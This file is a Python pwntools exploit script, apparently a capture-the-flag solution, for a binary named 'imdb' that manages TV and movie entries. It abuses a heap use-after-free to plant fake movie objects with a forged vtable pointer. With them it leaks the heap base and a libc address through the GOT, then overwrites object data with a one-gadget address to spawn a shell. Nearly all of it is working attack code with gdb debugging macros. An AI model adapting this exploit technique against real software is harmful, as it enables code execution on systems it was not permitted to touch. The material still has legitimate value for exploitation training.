#!/usr/bin/env python2
# encoding: utf-8

from pwn import *

context.update(arch='amd64', os = 'linux', bits=64, log_level = 'debug')

binary = './imdb'
e = ELF(binary)
e.checksec()

LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(LIBC)


if 'HOST' in args:
  io = remote(args['HOST'], int(args['PORT']))
else:
  io = process(binary)
  gdb.attach(io, '''
    #b *0x400EC0
    watch *(long*)0x601DC0 + *(long*)0x601DC8 + *(long*)0x601DD0 + *(long*)0x601DD8 

    set $fhd=0x0
    define dump_list
      set $hd=$arg0
      x/2xg $hd
      set $_node = *(long*)$hd
      #p/x $_node
      while ($_node && $_node!=$hd)
        x/4xg $_node
        set $_node = *(long*)($_node+0x10)
      end
    end

    commands 
      x/5i $rip
      x/10xg 0x601DC0
      set $item=0x601DC0
      set $addr=0
      
      while ($item < 0x601DF0)
        if ($addr==0 || (*(long*)$item>0 && *(long*)$item<$addr))
          set $addr=*(long*)$item       
        end
        set $item=$item+8
      end
      if ($addr > 0)
        x/120xg ($addr -0x10)
      end 

      set $item=0x601DC0
      while ($item < 0x601DF0 && $fhd==0)
        if (*(long*)$item > 0)
          if (*((long*)(*(long*)$item)) > 0x7f0000000000)
             set $fhd=(*((long*)(*(long*)$item)))
          end         
        end
        set $item=$item+8
      end 
      if $fhd>0 
        dump_list $fhd
      end
      continue
    end
    continue
  ''')


def add_tv(name, intro=''):
  global io
  io.recvuntil('Your choice?')
  io.sendline('1')
  io.recvuntil('name?')
  io.sendline(name)
  io.recvuntil('Season?')
  io.sendline('1')
  io.recvuntil('Rating?')
  io.sendline('1')
  io.recvuntil('introduction?')
  io.sendline(intro)
  io.recvuntil('added.')

def add_movie(name, actors=''):
  global io
  io.recvuntil('Your choice?')
  io.sendline('2')
  io.recvuntil('name?')
  io.sendline(name)
  io.recvuntil('Actors?')
  io.sendline(actors)
  io.recvuntil('Rating?')
  io.sendline('1')
  io.recvuntil('introduction?')
  io.sendline('1')
  io.recvuntil('added.')
  

def remove(name):
  global io
  io.recvuntil('Your choice?')
  io.sendline('3')
  io.recvuntil('remove?')
  io.sendline(name)

def show_actor(name):
  global io
  io.recvuntil('Your choice?')
  io.sendline('4')
  io.recvuntil(name + '>:')
  io.recvuntil('actors: ')
  data = io.readline().strip()
  return data

#pause()

strtol_got = e.got['strtol']
puts_got = e.got['puts']
items = 0x601DC0
movie_vtable = 0x4015B0

LIBC_STRTOL = libc.symbols['strtol']
LIBC_PUTS = libc.symbols['puts'] 
LIBC_SYSTEM = libc.symbols['system'] 
LIBC_BINSH = next(libc.search('/bin/sh\x00'))
LIBC_MAGIC_SYSTEM = 0x3f35a
#LIBC_MAGIC_SYSTEM = 0x3f306
#LIBC_MAGIC_SYSTEM = 0xd694f

add_tv('hold')
add_tv('hold')
add_tv('hold')
pause()

def leak(addr):
  add_tv('0')
  add_tv('0')
  add_tv('0')
  remove('0')
  pause()
  actors = pack(movie_vtable) + 'fake_moive'.ljust(64, '\0') + 'A'.ljust(128, '\0') + pack(0) + pack(addr)
  add_movie('movie', actors)
  pause()
  data = show_actor('fake_moive')
  remove('fake_moive')
  remove('moive')
  return data

heap_base = unpack(leak(items).ljust(8, '\x00')) 
puts = unpack(leak(puts_got).ljust(8, '\x00'))

print('Get heap_base = 0x%x' % heap_base)
print('Get puts = 0x%x' % puts)
libc_base = puts - LIBC_PUTS
magic_system = libc_base + LIBC_MAGIC_SYSTEM
print 'libc_base:', hex(libc_base)
print 'magic_system:', hex(magic_system)
pause()

add_tv('0')
add_tv('0')
add_tv('0')

remove('hold')

actors = pack(heap_base + 0x100) + 'a\x00'*4 + pack(magic_system)*6
actors = actors.ljust(0x50, 'A')
add_movie('movie', actors)
print 'check!'
pause()
remove('a')

io.interactive()




